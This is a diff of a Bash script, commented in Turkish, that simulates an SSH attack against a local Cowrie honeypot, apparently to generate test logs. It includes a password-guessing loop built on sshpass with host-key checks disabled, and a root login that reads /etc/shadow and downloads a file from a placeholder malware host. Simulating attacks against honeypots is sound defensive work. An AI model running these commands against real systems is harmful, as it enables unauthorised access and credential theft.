@@ -4,24 +4,25 @@ HOST="127.0.0.1"
 PORT="2222"
 PASSWORDS=("123456" "admin" "password" "root" "qwerty" "iloveyou")
 USERNAMES=("root" "admin" "user" "test")
-SUCCESS_PASS="root"   # Cowrie varsayılan olarak root:root'u kabul eder
+SUCCESS_PASS="root"
+SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=3"
 
 echo "=== Otomatik Saldırı Simülasyonu Başlıyor ==="
 echo ""
 
-# 1. Birkaç başarısız giriş denemesi
+# Başarısız denemeler
 for i in {1..5}; do
     USER=${USERNAMES[$RANDOM % ${#USERNAMES[@]}]}
     PASS=${PASSWORDS[$RANDOM % ${#PASSWORDS[@]}]}
     echo "[FAIL] Deneniyor: $USER:$PASS"
-    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p "$PORT" "$USER@$HOST" exit 2>/dev/null
+    sshpass -p "$PASS" ssh $SSH_OPTS -p "$PORT" "$USER@$HOST" exit 2>/dev/null
     sleep 0.5
 done
 
-# 2. Başarılı giriş ve komut çalıştırma (Cowrie root:root kabul eder)
+# Başarılı giriş ve komutlar
 echo ""
 echo "[SUCCESS] Başarılı giriş yapılıyor: root:root"
-sshpass -p "$SUCCESS_PASS" ssh -o StrictHostKeyChecking=no -p "$PORT" root@$HOST << 'EOF'
+sshpass -p "$SUCCESS_PASS" ssh $SSH_OPTS -p "$PORT" root@$HOST << 'EOF'
 ls -la
 cat /etc/shadow
 wget http://malware.example.com/badfile.sh
